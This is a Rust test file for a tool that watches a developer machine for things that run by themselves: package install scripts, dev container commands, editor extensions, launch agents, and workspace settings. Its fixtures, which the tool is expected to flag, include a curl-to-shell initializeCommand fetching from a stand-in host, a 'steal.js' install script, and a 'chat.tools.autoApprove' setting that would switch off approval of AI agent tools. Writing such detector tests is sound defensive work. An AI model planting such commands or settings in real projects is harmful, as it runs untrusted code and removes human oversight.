    let evil = e.checkout("dev/evil");
    link("../.cache/tasks.json", &evil.join(".vscode/tasks.json"));
    e.run();
    assert!(
        e.coverage(TASKS_KIND)
            .contains("could not be read: dev/evil/.vscode/tasks.json ("),
        "{}",
        e.coverage(TASKS_KIND)
    );
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    std::fs::remove_file(evil.join(".vscode/tasks.json")).unwrap();
    put(&evil.join(".vscode/tasks.json"), ON_OPEN);
    e.run();
    assert_eq!(
        e.found(),
        [pair("autorun.folder-open", "~/dev/evil/.vscode/tasks.json")]
    );
}

#[test]
fn a_file_that_cannot_be_read_hides_nothing_added_to_another_file_of_its_project() {
    // One project's dev container file is a link that leads nowhere, for good. A dev container
    // file added beside it in the same project is found, and so is a second addition to it a
    // week later.
    let e = Estate::new("failing-neighbour");
    let shop = e.checkout("dev/shop");
    link(
        "../../shared/devcontainer.json",
        &shop.join(".devcontainer/devcontainer.json"),
    );
    let blog = e.checkout("dev/blog");
    put(&blog.join(".devcontainer.json"), r#"{"name": "blog"}"#);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    put(
        &shop.join(".devcontainer.json"),
        r#"{"initializeCommand": "curl -s https://invented.example/x | sh"}"#,
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-open",
            "~/dev/shop/.devcontainer.json#/initializeCommand"
        )]
    );
    e.seen();
    put(
        &shop.join(".devcontainer.json"),
        r#"{"initializeCommand": "curl -s https://invented.example/x | sh", "postStartCommand": "sh .x"}"#,
    );
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-open",
            "~/dev/shop/.devcontainer.json#/postStartCommand"
        )]
    );
}

#[test]
fn a_new_file_beside_one_that_cannot_be_read_in_a_clone_made_after_the_first_check_is_found() {
    // A clone keeps a workspace file that is a link to nowhere; a later pull adds another
    // workspace file beside it. The folder was listed, and the new file was not in it.
    let e = Estate::new("clone-dangling-workspace");
    e.checkout("dev/old");
    e.run();
    let evil = e.checkout("dev/evil");
    link(
        "missing/team.code-workspace",
        &evil.join("team.code-workspace"),
    );
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    put(
        &evil.join("dev.code-workspace"),
        r#"{"folders": [{"path": "."}], "settings": {"chat.tools.autoApprove": true}}"#,
    );
    e.run();
    assert_eq!(
        e.found(),
        [
            pair(
                "autorun.editor-open",
                "~/dev/evil/dev.code-workspace#/folders"
            ),
            pair(
                "autorun.editor-open",
                "~/dev/evil/dev.code-workspace#/settings/chat.tools.autoApprove"
            ),
        ]
    );
}

#[test]
fn an_extension_that_cannot_be_looked_into_hides_no_extension_installed_later() {
    // One editor extension is a link into ~/Documents, which is never looked into. The folder of
    // extensions was still listed: an extension installed after that is found.
    let e = Estate::new("guarded-extension");
    let ext = e.home().join(".vscode/extensions");
    std::fs::create_dir_all(ext.join("ms-python.python-2024.1.0")).unwrap();
    std::fs::create_dir_all(e.home().join("Documents/my-ext")).unwrap();
    link(
        e.home().join("Documents/my-ext").to_str().unwrap(),
        &ext.join("invented.my-ext-0.0.1"),
    );
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    std::fs::create_dir_all(ext.join("invented.stealer-1.0.0")).unwrap();
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.editor-extension",
            "~/.vscode/extensions/invented.stealer"
        )]
    );
}

#[test]
fn a_failure_inside_a_project_kept_in_another_hides_nothing_added_to_the_outer_project() {
    // An agent worked in a project kept inside another, whose own package file is a link to
    // nowhere. A script added to the outer project is found.
    let e = Estate::new("nested-failure");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let inner = shop.join("tools/gen");
    put(&inner.join(".git/HEAD"), "ref: refs/heads/main\n");
    link("../../missing/package.json", &inner.join("package.json"));
    session(&e, "gen", &inner);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    package(
        &shop,
        "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
    );
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/dev/shop/package.json#/scripts/preinstall"
        )]
    );
}

#[test]
fn a_run_pointed_at_a_folder_the_home_walk_never_enters_tells_its_projects_once_and_raises_nothing()
{
    // The documented way to read projects in ~/Documents is a run pointed there. Its projects
    // were always there and were never read: no rule raises them, and one item tells which
    // places were read for the first time and how many things each holds that run by
    // themselves. Nothing about them is silent.
    let e = Estate::new("pointed-documents");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let app = e.checkout("Documents/code/app");
    package(&app, "\"postinstall\": \"node setup.js\"");
    agent(&app, HOOK);
    e.run();
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    e.run_in(&e.home().join("Documents"));
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(e.told(), ["checkout:machine:mac/Documents/code/app (2)"]);
    let one = e.contract(&["findings"]);
    let item = &one["findings"][0];
    assert_eq!(item["finding"]["severity"], "informational", "{item}");
}

#[test]
fn a_project_deeper_than_the_walk_goes_is_told_once_when_a_run_reaches_it_and_raises_nothing() {
    // The walk of the home folder lists five levels; a project at the sixth is read for the
    // first time by a run pointed above it.
    let e = Estate::new("deep");
    let deep = e.checkout("src/clients/acme/apps/web/frontend");
    package(&deep, "\"postinstall\": \"node setup.js\"");
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    e.run_in(&e.home().join("src"));
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(
        e.told(),
        ["checkout:machine:mac/src/clients/acme/apps/web/frontend (1)"]
    );
}

#[test]
fn a_first_agent_session_in_an_old_project_outside_the_walk_is_told_once_and_raises_nothing() {
    // A week after the first check the owner starts an agent, for the first time, in an old
    // project in a hidden folder the walk never lists. Sessions name folders; they cannot show
    // that the project is new.
    let e = Estate::new("first-session");
    let other = e.checkout("dev/shop");
    session(&e, "shop", &other);
    let old = e.home().join(".config/tool");
    put(&old.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&old, "\"preinstall\": \"node x.js\"");
    agent(&old, HOOK);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    session(&e, "tool", &old);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(e.told(), ["checkout:machine:mac/.config/tool (2)"]);
}

#[test]
fn a_folder_that_could_not_be_listed_on_the_first_day_is_told_once_when_it_can_be_and_raises_nothing()
 {
    let e = Estate::new("unlisted-day-one");
    let old = e.checkout("archive/old");
    package(&old, "\"postinstall\": \"node setup.js\"");
    {
        let _l = Locked::new(e.home().join("archive"));
        e.run();
    }
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    e.run();
    assert_eq!(e.found(), [pair(FIRST_READ, "mac")]);
    assert_eq!(e.told(), ["checkout:machine:mac/archive/old (1)"]);
}

#[test]
fn on_a_store_from_before_what_was_added_since_its_last_reading_is_found_whatever_run_comes_first()
{
    // An older build read a project in ~/Documents only through runs pointed there. Whichever
    // run of this build comes first, the app's run of the home folder, which does not look
    // into it, or a run pointed there, an install script added since is found.
    for pointed_first in [false, true] {
        let e = Estate::new("seam");
        let app = e.checkout("Documents/code/app");
        package(&app, "\"postinstall\": \"node setup.js\"");
        e.run_in(&e.home().join("Documents"));
        e.run();
        e.made_before_units();
        package(
            &app,
            "\"postinstall\": \"node setup.js\", \"preinstall\": \"node x.js\"",
        );
        if !pointed_first {
            e.run();
        }
        e.run_in(&e.home().join("Documents"));
        assert_eq!(
            e.found(),
            [pair(
                "autorun.package-install",
                "~/Documents/code/app/package.json#/scripts/preinstall"
            )],
            "pointed first: {pointed_first}"
        );
    }
}

/// The page of changes, as `immune view` writes it.
fn changes_page(e: &Estate) -> String {
    let out = Command::new(env!("CARGO_BIN_EXE_immune"))
        .args(["view", "--no-open", "--store"])
        .arg(e.store())
        .output()
        .unwrap();
    let pages = String::from_utf8(out.stdout).unwrap();
    let path = pages
        .lines()
        .find(|p| p.ends_with("changes.html"))
        .unwrap()
        .to_string();
    std::fs::read_to_string(path).unwrap()
}

#[test]
fn the_changes_page_the_status_and_the_journal_count_a_first_reading_alike() {
    // On the first day everything found is the baseline: the page says so and counts nothing
    // as added, as the status does. A later first reading is shown as such on the page, and
    // the counts of the page are the status's.
    let e = Estate::new("page-agrees");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    agent(&shop, HOOK);
    put(&e.home().join(".zshrc"), "export A=1\n");
    put(
        &e.home()
            .join("Library/LaunchAgents/com.invented.sync.plist"),
        "<plist/>\n",
    );
    let app = e.checkout("Documents/code/app");
    package(&app, "\"postinstall\": \"node setup.js\"");
    e.run();
    assert!(e.status()["since_previous_run"].is_null());
    let page = changes_page(&e);
    assert!(page.contains("+0 added, 0 changed, 0 removed, "), "{page}");
    assert!(!page.contains("<td>added</td>"), "{page}");
    e.run_in(&e.home().join("Documents"));
    let since = &e.status()["last_finished_run"]["since_previous_run"];
    // The project, its file and the ways it holds are a first reading, never an addition.
    assert_eq!(since["added"], 0, "{since}");
    let page = changes_page(&e);
    let counts = format!(
        "+{} added, {} changed, {} removed, 2 things read for the first time and kept as the baseline",
        since["added"], since["changed"], since["removed"]
    );
    assert!(page.contains(&counts), "{counts}\n{page}");
    assert!(page.contains("<td>first reading</td>"), "{page}");
    // The journal marks it, and the item rests on the place it names.
    assert_eq!(
        e.rows(
            "SELECT CAST(COUNT(*) AS TEXT) FROM journal
             WHERE text = 'read for the first time' AND predicate = 'watched_as'"
        ),
        ["1"]
    );
    assert_eq!(e.told(), ["checkout:machine:mac/Documents/code/app (1)"]);
}

#[test]
fn a_watched_file_read_before_that_cannot_be_read_now_is_a_finding_with_why_and_a_change_meanwhile_is_found_after()
 {
    // Someone who wants to change a watched file unseen would break its reading first. Losing
    // sight of a file read before is a finding of its kind, with why, and the file stays in
    // coverage as not read; when it reads again, what changed meanwhile is a change.
    let e = Estate::new("lose-sight-file");
    let zshrc = e.home().join(".zshrc");
    put(&zshrc, "export A=1\n");
    e.run();
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&zshrc, std::fs::Permissions::from_mode(0o000)).unwrap();
        e.run();
        std::fs::set_permissions(&zshrc, std::fs::Permissions::from_mode(0o644)).unwrap();
    }
    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.zshrc")]);
    assert_eq!(
        e.rows(
            "SELECT new_value FROM journal WHERE entry = 'not_read'
               AND subject = 'file:machine:mac/.zshrc'"
        ),
        ["Permission denied (os error 13)"]
    );
    e.seen();
    put(&zshrc, "export A=2\n");
    e.run();
    assert_eq!(e.found(), [pair("watched.shell-profile", "~/.zshrc")]);
    assert_eq!(
        e.rows(
            "SELECT entry FROM journal WHERE subject = 'file:machine:mac/.zshrc'
               AND predicate = 'has_content' ORDER BY seq DESC LIMIT 1"
        ),
        ["changed"]
    );
}

#[test]
fn a_project_file_read_before_that_cannot_be_read_now_is_a_finding_with_why_and_a_change_meanwhile_is_found_after()
 {
    let e = Estate::new("lose-sight-project");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    e.run();
    let file = shop.join("package.json");
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o000)).unwrap();
        e.run();
        std::fs::set_permissions(&file, std::fs::Permissions::from_mode(0o644)).unwrap();
    }
    assert_eq!(
        e.found(),
        [pair("autorun.package-install", "~/dev/shop/package.json")]
    );
    assert!(
        e.rows("SELECT new_value FROM journal WHERE entry = 'not_read'")
            .iter()
            .any(|why| why.contains("Permission denied")),
    );
    // What it held is kept while it cannot be read: the script is not gone.
    assert!(
        !e.rows(
            "SELECT subject FROM assertion WHERE layer = 'live'
               AND subject LIKE '%dev/shop/package.json#/scripts/postinstall'"
        )
        .is_empty()
    );
    e.seen();
    package(&shop, "\"postinstall\": \"node steal.js\"");
    e.run();
    assert_eq!(
        e.found(),
        [pair(
            "autorun.package-install",
            "~/dev/shop/package.json#/scripts/postinstall"
        )]
    );
}

#[test]
fn what_is_removed_from_a_place_read_in_full_is_gone_while_another_place_of_its_kind_cannot_be_read()
 {
    // The reading of a kind is partial when one of its places cannot be read. What is gone
    // from a place that was read in full is still gone, and an autostart item removed is a
    // finding, as an install script removed from a project is journaled as removed.
    let e = Estate::new("removed-while-partial");
    let agents = e.home().join("Library/LaunchAgents");
    put(&agents.join("com.invented.sync.plist"), "<plist/>\n");
    let system = e.0.join("system/Library/LaunchAgents");
    put(&system.join("com.invented.helper.plist"), "<plist/>\n");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let blog = e.checkout("dev/blog");
    package(&blog, "\"postinstall\": \"node setup.js\"");
    e.run();
    let _locked = Locked::new(agents.clone());
    let blog_file = blog.join("package.json");
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&blog_file, std::fs::Permissions::from_mode(0o000)).unwrap();
    }
    std::fs::remove_file(system.join("com.invented.helper.plist")).unwrap();
    package(&shop, "\"test\": \"jest\"");
    let report = e.run();
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&blog_file, std::fs::Permissions::from_mode(0o644)).unwrap();
    }
    assert!(
        e.coverage(AUTOSTART_KIND).starts_with("partial|"),
        "{}",
        e.coverage(AUTOSTART_KIND)
    );
    assert!(
        e.found().contains(&pair(
            "watched.autostart",
            "/Library/LaunchAgents/com.invented.helper.plist"
        )),
        "{:?}",
        e.found()
    );
    assert!(
        report.lines().any(|l| l.trim_start().starts_with("gone ")
            && l.ends_with("dev/shop/package.json#/scripts/postinstall")),
        "{report}"
    );
}

#[test]
fn after_the_first_check_nothing_present_and_unrecorded_is_ever_silent() {
    // No false calm by construction: once the store has had its first check, a place read
    // for the first time is told, never taken silently, whatever brought it into reach.
    let e = Estate::new("never-silent");
    let shop = e.checkout("dev/shop");
    package(&shop, "\"postinstall\": \"node setup.js\"");
    let app = e.checkout("Documents/code/app");
    package(&app, "\"postinstall\": \"node setup.js\"");
    let archived = e.checkout("archive/old");
    package(&archived, "\"postinstall\": \"node setup.js\"");
    let agents = e.home().join("Library/LaunchAgents");
    put(&agents.join("com.invented.sync.plist"), "<plist/>\n");
    let hidden = e.home().join(".tools/helper");
    put(&hidden.join(".git/HEAD"), "ref: refs/heads/main\n");
    package(&hidden, "\"preinstall\": \"node x.js\"");
    {
        let _a = Locked::new(e.home().join("archive"));
        let _b = Locked::new(agents.clone());
        e.run();
    }
    let after = e.last_entry();
    e.run();
    e.run_in(&e.home().join("Documents"));
    session(&e, "helper", &hidden);
    e.run_with(&e.home(), &e.0.join("sessions"));
    assert_eq!(e.silent_after(after), 0);
    assert_eq!(
        e.told(),
        [
            "file:machine:mac/Library/LaunchAgents (1)",
            "checkout:machine:mac/archive/old (1)",
            "checkout:machine:mac/Documents/code/app (1)",
            "checkout:machine:mac/.tools/helper (1)"
        ]
    );
}

#[test]
fn a_row_a_newer_version_reads_first_in_a_clone_found_earlier_is_told_once_and_raises_nothing() {
    // A clone made after the first check is found. A later version reads a row the older one
    // did not: what the clone held there could have been there since it arrived, so it is told
    // once, not raised.
    let e = Estate::new("new-row-old-clone");
    e.checkout("dev/old");
    e.run();
    let evil = e.checkout("dev/evil");
    package(&evil, "\"postinstall\": \"node setup.js\"");
    put(
        &evil.join(".devcontainer.json"),
        r#"{"initializeCommand": "sh .x"}"#,
    );
    e.run();
    assert!(
        e.found().contains(&pair(
            "autorun.editor-open",
            "~/dev/evil/.devcontainer.json#/initializeCommand"
        )),
        "{:?}",
        e.found()
    );
    e.seen();
    // As a version that did not read dev container files left the store.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM assertion WHERE kind LIKE '.devcontainer/devcontainer.json%';
         DELETE FROM coverage WHERE kind LIKE '.devcontainer/devcontainer.json%';
         DELETE FROM unit_read WHERE kind LIKE '.devcontainer/devcontainer.json%';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/dev/evil (1)"]);
}

#[test]
fn a_file_a_newer_version_could_not_read_at_first_in_a_clone_found_earlier_is_told_once_when_it_reads()
 {
    // The clone was found when it arrived, but the store holds nothing of a row a later
    // version reads, whose file fails at first. When it reads, nothing shows it is new: it is
    // told once, not raised.
    let e = Estate::new("new-row-fails-old-clone");
    e.checkout("dev/old");
    e.run();
    let evil = e.checkout("dev/evil");
    package(&evil, "\"postinstall\": \"node setup.js\"");
    link(
        "missing/devcontainer.json",
        &evil.join(".devcontainer.json"),
    );
    e.run();
    e.seen();
    // As a version that did not read dev container files left the store.
    let db = Connection::open(e.store()).unwrap();
    db.execute_batch(
        "DELETE FROM assertion WHERE kind LIKE '.devcontainer/devcontainer.json%';
         DELETE FROM coverage WHERE kind LIKE '.devcontainer/devcontainer.json%';
         DELETE FROM unit_read WHERE kind LIKE '.devcontainer/devcontainer.json%';",
    )
    .unwrap();
    drop(db);
    e.run();
    assert!(e.rules().is_empty(), "{:?}", e.findings(false));
    std::fs::remove_file(evil.join(".devcontainer.json")).unwrap();
    put(
        &evil.join(".devcontainer.json"),
        r#"{"initializeCommand": "sh .x"}"#,
    );
    e.run();
    assert_eq!(e.rules(), [FIRST_READ], "{:?}", e.findings(false));
    assert_eq!(e.told(), ["checkout:machine:mac/dev/evil (1)"]);
}
